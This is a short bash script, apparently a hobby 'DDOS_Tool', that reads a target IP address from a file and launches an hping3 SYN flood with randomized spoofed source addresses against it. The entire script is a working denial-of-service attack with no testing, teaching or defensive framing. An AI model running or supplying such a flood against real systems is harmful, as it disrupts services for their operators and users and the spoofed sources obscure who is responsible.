#/bin/bash

file="/home/patrickbateman/IT_Hobby_Stuff/Bash/DDOS_Tool/ip_address.txt"

target=$(cat "$file")

echo $target


sudo hping3 -S --flood --rand-source $target
